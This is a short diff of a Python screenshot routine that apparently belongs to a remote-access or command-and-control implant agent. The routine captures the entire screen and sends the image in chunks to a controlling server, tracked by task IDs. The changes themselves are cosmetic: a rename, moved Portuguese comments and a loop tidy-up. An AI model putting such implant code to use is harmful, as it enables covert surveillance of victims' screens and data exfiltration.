@@ -1,10 +1,9 @@
-def screenshot(self, task_id):
+def screenshot2(self, task_id):
     import io, base64, json
     from datetime import datetime
-    from PIL import ImageGrab  # funciona no Windows
+    from PIL import ImageGrab
 
-    # captura a tela inteira
-    img = ImageGrab.grab()
+    img = ImageGrab.grab()  # captura toda a tela
     buf = io.BytesIO()
     img.save(buf, format="PNG")
     sh_data = buf.getvalue()
@@ -26,7 +25,7 @@ def screenshot(self, task_id):
         }
         initial_response = self.postMessageAndRetrieveResponse(data)
 
-        for i in range(0, total_chunks):
+        for i in range(total_chunks):
             if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                 return "Job stopped."
 
